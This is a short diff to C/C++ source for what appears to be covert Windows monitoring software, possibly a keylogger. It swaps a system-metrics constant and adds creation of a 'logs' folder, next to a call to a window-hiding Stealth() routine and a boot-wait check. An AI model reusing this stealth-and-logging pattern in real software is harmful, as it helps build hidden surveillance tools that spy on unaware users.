@@ -215,14 +215,17 @@ void Stealth()
 bool IsSystemBooting() 
 {
 // A workaround fix for missing definition of SM_SYSTEMDOCKED
-//	return GetSystemMetrics(0x2004) != 0;
-	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+	return GetSystemMetrics(0x2004) != 0;
+	// return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
 }
 
 int main()
 {
 	// Call the visibility of window function.
 	Stealth(); 
+
+	// Create 'logs' folder if did not exist
+	CreateDirectoryW(L"logs", NULL);
 	
 	// Check if the system is still booting up
 	#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
